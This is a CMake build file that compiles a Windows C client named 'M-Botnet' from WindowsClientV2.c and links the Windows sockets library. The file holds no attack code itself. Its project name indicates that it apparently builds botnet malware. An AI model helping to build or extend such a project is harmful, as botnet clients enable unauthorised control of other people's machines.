cmake_minimum_required(VERSION 3.10)
project(Botnet C)

set(CMAKE_C_STANDARD 99)

add_executable(M-Botnet WindowsClientV2.c)
target_link_libraries(M-Botnet ws2_32)